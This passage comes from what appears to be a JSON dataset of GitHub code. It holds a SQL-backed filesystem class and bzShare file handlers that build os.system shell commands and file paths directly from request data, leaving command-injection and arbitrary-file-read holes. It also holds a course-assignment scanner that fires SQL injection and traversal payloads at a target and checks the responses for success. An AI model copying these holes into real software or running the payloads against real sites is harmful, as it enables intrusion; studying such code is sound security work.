source or not target_parent:\n            return False\n        # Moving an re-assigning tree structures\n        par = source.parent\n        par.sub_items.remove(source)\n        del par.sub_names_idx[source.file_name]\n        source.parent = target_parent\n        target_parent.sub_items.add(source)\n        target_parent.sub_names_idx[source.file_name] = source\n        # Updating SQL database.\n        self._update_in_db(par)\n        self._update_in_db(target_parent)\n        return\n\n    def rename(self, item, file_name):\n        \"\"\"Renames object 'item' into file_name.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        if item.parent:\n            del item.parent.sub_names_idx[item.file_name]\n            item.file_name = file_name\n            item.parent.sub_names_idx[item.file_name] = item\n        if item.is_dir:\n            self._update_in_db(item)\n        else:\n            self._update_in_db(item.parent)\n        return True\n\n    def chown(self, item, owner):\n        \"\"\"Assign owner of 'item' to new owner, recursively.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        def _chown_recursive(item_, owner_):\n            for sub_ in item_.sub_items:\n                _chown_recursive(sub_, owner_)\n            item_.owner = owner_\n            if item_.is_dir:\n                self._update_in_db(item_)\n            return\n        _chown_recursive(item, owner)\n        if not item.is_dir:\n            self._update_in_db(item.parent)\n        return True\n\n    def mkfile(self, path_parent, file_name, owner, content):\n        \"\"\"Inject object into filesystem, while passing in content. The content\n        itself would be indexed in FileStorage.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_uuid = FileStorage.new_unique_file(content)\n        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def mkdir(self, path_parent, file_name, owner):\n        \"\"\"Inject folder into filesystem.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_fl = self.fsNode(True, file_name, owner, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        self._insert_in_db(n_fl)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def listdir(self, path):\n        \"\"\"Creates a list of files in the directory 'path'. Attributes of the returned\n        result contains:\n\n            file-name   - File name\n            file-size   - File size\n            is-dir      - Whether is directory\n            owner       - The handle of the owner\n            upload-time - Time uploaded, in float since epoch.\n\n        The result should always be a list, and please index it with your own\n        habits or modify the code.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return []\n        # List directory, given the list(dict()) result...\n        dirs = list()\n        for item in path.sub_items:\n            attrib = dict()\n            # try:\n            attrib['file-name'] = item.file_name\n            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size\n            attrib['is-dir'] = item.is_dir\n            attrib['owner'] = item.owner\n            attrib['upload-time'] = item.upload_time\n            # except:\n            #     continue\n            dirs.append(attrib)\n        # Give the results to downstream\n        return dirs\n\n    def shell(self):\n        \"\"\"Interactive shell for manipulating SQLFS. May be integrated into other\n        utilites in the (far) futuure. Possible commands are:\n\n            ls             - List content of current directory.\n            cat name       - View binary content of the object 'name'.\n            cd             - Change CWD into the given directory, must be relative.\n                             or use '..' to go to parent directory.\n            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.\n            rename src nam - Rename file / folder 'src' to 'nam'.\n            mkdir name     - Make directory of 'name' under this directory.\n            mkfile name    - Make empty file of 'name' under this directory.\n            rm name        - Remove (recursively) object of 'name' under this directory.\n            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.\n            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.\n            q              - Exit shell.\n\n        Would be done in a infinite loop. Use 'q' to leave.\"\"\"\n        cwd = self.fs_root\n        cuser = 'system'\n        cwd_list = ['']\n        while True:\n            cwd_fl = ''.join((i + '/') for i in cwd_list)\n            print('root@postgres %s$ ' % cwd_fl, end='')\n            cmd_input = input()\n            cmd = cmd_input.split(' ')\n            op = cmd[0]\n            if op == 'ls':\n                res = self.listdir(cwd)\n                # Prettify the result\n                print('Owner       Upload Time         Size            Filename            ')\n                print('--------------------------------------------------------------------')\n                for item in res:\n                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))\n                print('Total: %d' % len(res))\n                print('')\n            elif op == 'cat':\n                dest = self.locate(cmd[1], parent=cwd)\n                print(self.get_content(dest))\n            elif op == 'cd':\n                if cmd[1] == '..':\n                    cwd_dest = cwd.parent\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list = cwd_list[:-1]\n                else:\n                    cwd_dest = cwd.sub_names_idx[cmd[1]]\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list.append(cmd[1])\n            elif op == 'chown':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.chown(dest, cmd[2])\n            elif op == 'rename':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.rename(dest, cmd[2])\n            elif op == 'mkdir':\n                self.mkdir(cwd, cmd[1], cuser)\n            elif op == 'mkfile':\n                self.mkfile(cwd, cmd[1], cuser, b'')\n            elif op == 'rm':\n                self.remove(self.locate(cmd[1], parent=cwd))\n            elif op == 'cp':\n                src = self.locate(cmd[1], parent=cwd)\n                self.copy(src, cmd[2])\n            elif op == 'mv':\n                src = self.locate(cmd[1], parent=cwd)\n                self.move(src, cmd[2])\n            elif op == 'q':\n                break\n            else:\n                print('Unknown command \"%s\".' % op)\n        return\n    pass\n\nFilesystem = FilesystemType()\n\n################################################################################\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bzShare-dev/bzShare/blob/689e0a9f3cf5e0a625104d9df5ccaffd810d4ee9",
        "file_path": "/bzs/module_files.py",
        "source": "\nimport base64\nimport binascii\nimport io\nimport json\nimport re\nimport time\nimport tornado\n\nfrom bzs import files\nfrom bzs import const\nfrom bzs import users\nfrom bzs import preproc\n\n# TODO: Remove this!\nimport os\n\ndef encode_str_to_hexed_b64(data):\n    return binascii.b2a_hex(base64.b64encode(data.encode('utf-8'))).decode('utf-8')\ndef decode_hexed_b64_to_str(data):\n    return base64.b64decode(binascii.unhexlify(data.encode('utf-8'))).decode('utf-8')\n\n################################################################################\n\nclass FilesListHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, target_path):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async(target_path):\n            # Getting file template.\n            file_temp = files.get_static_data('./static/files.html')\n\n            # Retrieving list target.\n            try:\n                target_path = decode_hexed_b64_to_str(target_path)\n            except:\n                target_path = '/'\n            if not target_path:\n                target_path = '/'\n\n            # Getting parental directorial list\n            files_hierarchy = target_path.split('/')\n            files_hierarchy_list = list()\n            while '' in files_hierarchy:\n                files_hierarchy.remove('')\n            files_hierarchy = [''] + files_hierarchy\n            files_hierarchy_cwd = ''\n            for i in range(0, len(files_hierarchy)):\n                files_hierarchy[i] += '/'\n                files_hierarchy_cwd += files_hierarchy[i]\n                files_hierarchy_list.append(dict(\n                    folder_name=files_hierarchy[i],\n                    href_path='/files/list/%s' % encode_str_to_hexed_b64(files_hierarchy_cwd),\n                    disabled=(i == len(files_hierarchy) - 1)))\n                continue\n\n            # Getting current directory content\n            files_attrib_list = list()\n            for file_name in os.listdir(target_path):\n                try: # In case of a permission error.\n                    actual_path = target_path + file_name\n                    attrib = dict()\n                    attrib['file-name'] = file_name\n                    attrib['allow-edit'] = True\n                    attrib['file-size'] = files.format_file_size(os.path.getsize(actual_path))\n                    attrib['owner'] = 'root'\n                    attrib['date-uploaded'] = time.ctime(os.path.getctime(actual_path))\n                    # Detecting whether is a folder\n                    if os.path.isdir(actual_path):\n                        attrib['mime-type'] = 'directory/folder'\n                    else:\n                        attrib['mime-type'] = files.guess_mime_type(file_name)\n                    # And access links should differ between folders and files\n                    if attrib['mime-type'] == 'directory/folder':\n                        attrib['target-link'] = '/files/list/%s' % encode_str_to_hexed_b64(actual_path + '/')\n                    else:\n                        attrib['target-link'] = '/files/download/%s/%s' % (encode_str_to_hexed_b64(actual_path), file_name)\n                    attrib['uuid'] = encode_str_to_hexed_b64(actual_path)\n                    files_attrib_list.append(attrib)\n                except Exception:\n                    pass\n            cwd_uuid = encode_str_to_hexed_b64(files_hierarchy_cwd)\n\n            # File actually exists, sending data\n            working_user = users.get_user_by_cookie(\n                self.get_cookie('user_active_login', default=''))\n            file_temp = preproc.preprocess_webpage(file_temp, working_user,\n                files_attrib_list=files_attrib_list,\n                files_hierarchy_list=files_hierarchy_list,\n                cwd_uuid=cwd_uuid)\n            future.set_result(file_temp)\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async,\n            target_path)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesDownloadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, file_path, file_name):\n        # Something that I do not wish to write too many times..\n        def invoke_404():\n            self.set_status(404, \"Not Found\")\n            self._headers = tornado.httputil.HTTPHeaders()\n            self.add_header('Content-Length', '0')\n            self.flush()\n            return\n\n        # Get file location (exactly...)\n        try:\n            file_path = decode_hexed_b64_to_str(file_path)\n        except Exception:\n            file_path = ''\n        if not file_path:\n            invoke_404()\n            return\n\n        # File actually exists, sending data\n        try:\n            file_handle = open(file_path, 'rb')\n        except Exception:\n            invoke_404()\n            return\n        file_data = file_handle.read()\n        file_handle.close()\n        file_stream = io.BytesIO(file_data)\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'application/x-download')\n        self.add_header('Content-Length', str(len(file_data)))\n\n        # Asynchronous web request...\n        file_block_size = 64 * 1024 # 64 KiB / Chunk\n        file_block = bytes()\n\n        while file_stream.tell() < len(file_data):\n            byte_pos = file_stream.tell()\n            # Entry to the concurrency worker\n            future = tornado.concurrent.Future()\n            # Concurrent worker\n            def retrieve_data_async():\n                block = file_stream.read(file_block_size)\n                future.set_result(block)\n            # Injection and pending\n            tornado.ioloop.IOLoop.instance().add_callback(retrieve_data_async)\n            # Reset or read\n            file_block = yield future\n            self.write(file_block)\n            file_block = None\n            self.flush()\n        file_block = None\n        self.finish()\n\n        # Release memory...\n        file_stream = None\n        file_data = None\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesOperationHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async():\n            operation_content_raw = self.request.body\n            operation_content = json.loads(operation_content_raw.decode('utf-8', 'ignore'))\n            action = operation_content['action']\n            sources = operation_content['source']\n            if type(sources) == list:\n                for i in range(0, len(sources)):\n                    try:\n                        sources[i] = decode_hexed_b64_to_str(sources[i])\n                    except:\n                        pass\n            else:\n                sources = decode_hexed_b64_to_str(sources)\n            if action in ['copy', 'move']:\n                try:\n                    target = decode_hexed_b64_to_str(operation_content['target'])\n                except:\n                    target = '/'\n            elif action in ['rename', 'new-folder']:\n                try:\n                    target = operation_content['target']\n                except:\n                    target = sources # I am not handling more exceptions as this is brutal enough\n            # Done assigning values, now attempting to perform operation\n            if action == 'copy':\n                for source in sources:\n                    os.system('cp \"D:%s\" \"D:%s\"' % (source, target))\n            elif action == 'move':\n                for source in sources:\n                    os.system('mv \"D:%s\" \"D:%s\"' % (source, target))\n            elif action == 'delete':\n                for source in sources:\n                    os.system('rm \"D:%s\"' % source)\n            elif action == 'rename':\n                os.system('rename \"D:%s\" \"%s\"' % (sources, target))\n            elif action == 'new-folder':\n                os.system('mkdir \"D:%s%s\"' % (sources, target))\n            future.set_result('')\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n\n################################################################################\n\nclass FilesUploadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self, target_path, file_name):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def save_file_async(alter_ego, target_path, file_name):\n            upload_data = alter_ego.request.body\n            target_path = decode_hexed_b64_to_str(target_path)\n            # Attempting to write to file... otherwise might try to rename until\n            # File does not exist.\n            def get_non_duplicate_path(file_path):\n                if not os.path.exists('D:' + file_path):\n                    return file_path\n                duplicate = 1\n                while duplicate < 101:\n                    new_path = re.sub(r'\\.(.*?)$', ' (%d).\\\\1' % duplicate, file_path)\n                    if not os.path.exists('D:' + new_path):\n                        return new_path\n                    duplicate = duplicate + 1\n                return ''\n            file_path = get_non_duplicate_path(target_path + file_name)\n            if not file_path:\n                future.set_result('bzs_upload_failure')\n                return\n            # Committing changes to database\n            file_stream = open(file_path, 'wb')\n            file_stream.write(upload_data)\n            file_stream.close()\n            # Final return\n            future.set_result('bzs_upload_success')\n        tornado.ioloop.IOLoop.instance().add_callback(save_file_async,\n            self, target_path, file_name)\n\n        response_temp = yield future\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(response_temp)))\n        self.write(response_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/b051a88972185af95c70ccfc885141e80b15e313",
        "file_path": "/payloads/inject.py",
        "source": "import requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\tprint payload\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn payload\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\tif attackType == sql_injection:\n\t\t\n\t\tfalsePayload = sqli.get_false()\n\t\t#if get\n\t\tif method == \"GET\":\n\t\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+falsePayload\n\t\t\tcontent = requests.get(getURL)\n\t\t\tbadhtml =  content.text\n\t\t#if post\n\t\telif method == \"POST\":\n\t\t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t\t\tbadhtml = content.text\n\n\t\tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\t\treturn match\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\n\nif __name__ == \"__main__\":\n\t## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\t#url = \"/sqli/sqli.php\"\n\t#payloads = sqli.get_all()\n\t#for payload in payloads:\n\t#\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\turl = \"/serverside/eval2.php\"\n\tpayloads = ssci.get_all(url)\n\tfor payload in payloads:\n\t\tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t \tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/b051a88972185af95c70ccfc885141e80b15e313",
        "file_path": "/payloads/sqli.py",
        "source": "import difflib\n\ndef get_false():\n\tpayloads = [\"' and ' 1=2\"]\n\treturn payloads\n\ndef get_all():\n\tpayloads = [\"' or '1=1\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/5d6a00c5c3a8909cc4cfe054c31c063b4e26c871",
        "file_path": "/payloads/inject.py",
        "source": "import requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, method, paramname, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn True\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\tif attackType == sql_injection:\n\t\t\n\t\tfalsePayload = sqli.get_false()[0]\n\t\tbadhtml = \"\"\n\t\t#if get\n\t\tif method == \"GET\":\n\t\t\tgetURL = url + \"?\" + paramname+\"=\"+falsePayload\n\t\t\tcontent = requests.get(getURL)\n\t\t\tbadhtml =  content.text\n\t\t#if post\n\t\telif method == \"POST\":\n\t\t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t\t\tbadhtml = content.text\n\n\t\tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\t\treturn None\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\ndef get_payloads(v=False):\n\tpayloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n\tif v == True:\n\t\tfor p in payloads:\n\t\t\tprint p[0]\n\n\treturn payloads\n\n\nif __name__ == \"__main__\":\n\tget_payloads(v=True)\n\n\t## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\t#url = \"/sqli/sqli.php\"\n\t#payloads = sqli.get_all()\n\t#for payload in payloads:\n\t#\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\t# url = \"/serverside/eval2.php\"\n\t# payloads = ssci.get_all(url)\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t \tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/5d6a00c5c3a8909cc4cfe054c31c063b4e26c871",
        "file_path": "/payloads/test_inject.py",
        "source": "import requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n\n        if(content.status_code==200) and badhtml[1]==html:\n            compare_res = sqli.compare_html(badhtml[0], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n\n        else:\n            match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for 